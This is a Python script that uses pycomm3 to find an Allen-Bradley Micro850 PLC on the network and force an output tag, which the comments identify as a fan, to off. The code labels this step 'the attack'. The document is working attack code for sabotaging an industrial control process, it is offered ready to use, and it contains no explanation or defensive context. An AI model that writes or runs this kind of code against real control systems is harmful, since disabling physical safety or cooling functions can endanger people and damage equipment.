# Requires: pycomm3 library (pip install pycomm3)

import sys
import time
from pycomm3 import CIPDriver, Exceptions

# Configuration - Adjust these values
PLC_IP_ADDRESS = None  # Set to None to automatically find the PLC
COMMUNICATION_PATH = 'ENET' # Change to your actual communication path if not ethernet
TARGET_MODULE = 'Micro850'  # Expected module name, adjust if necessary.


def find_plc_ip():
    """
    Attempts to discover the PLC's IP address using pycomm3.
    """
    try:
        with CIPDriver(COMMUNICATION_PATH) as driver:
            devices = driver.list_identity()
            if devices:
                for device in devices:
                    if TARGET_MODULE in device['product_name']:  # Check the name.  Make this robust!
                        return device['ip_address']
                print(f"PLC with module '{TARGET_MODULE}' not found.")
                return None
            else:
                print("No devices found on the network.")
                return None
    except Exception as e:
        print(f"Error discovering PLC: {e}")
        return None



def inhibit_response_function(plc_ip, tag_to_override, override_value):
    """
    Inhibits a response function by manipulating an output tag.

    Args:
        plc_ip (str): The IP address of the PLC.
        tag_to_override (str): The name of the output tag to override (e.g., "_IO_EM_DO_02").
        override_value (bool): The value to force the output to (True or False).
    """
    try:
        with CIPDriver(plc_ip) as plc:
            # Check connection
            print(f"Connected to PLC at {plc_ip}")

            # Get Tag Details for more precise control
            try:
                tag_data = plc.read(tag_to_override)
                if not tag_data.status == "Success":
                    print(f"Error reading tag {tag_to_override}: {tag_data.status}")
                    return
                print(f"Current value of {tag_to_override}: {tag_data.value}")

            except Exceptions.CommError as e:
                print(f"Error getting details for tag {tag_to_override}: {e}")
                return


            # Override the tag
            try:
                plc.write(tag_to_override, override_value)
                print(f"Successfully forced {tag_to_override} to {override_value}")
            except Exceptions.CommError as e:
                print(f"Error overriding {tag_to_override}: {e}")
            except Exception as e:
                print(f"Unexpected error during write: {e}")
            finally:
              #Read back and verify change, also important for ensuring that PLC actually allows override.
                try:
                    tag_data = plc.read(tag_to_override)
                    if not tag_data.status == "Success":
                        print(f"Error reading tag {tag_to_override}: {tag_data.status}")
                        return
                    print(f"Value of {tag_to_override} after write: {tag_data.value}")

                except Exceptions.CommError as e:
                    print(f"Error getting details for tag {tag_to_override}: {e}")
                    return




    except Exception as e:
        print(f"Error communicating with PLC: {e}")


if __name__ == "__main__":
    # Determine PLC IP address
    if PLC_IP_ADDRESS is None:
        PLC_IP_ADDRESS = find_plc_ip()
        if PLC_IP_ADDRESS is None:
            print("Could not automatically determine PLC IP address.  Exiting.")
            sys.exit(1)
        print(f"Found PLC IP address: {PLC_IP_ADDRESS}")


    # Parameters for the attack - MODIFY THESE
    target_tag = "_IO_EM_DO_02"  # The Fan output
    override_value = False  # Force the fan OFF

    # Execute the attack
    inhibit_response_function(PLC_IP_ADDRESS, target_tag, override_value)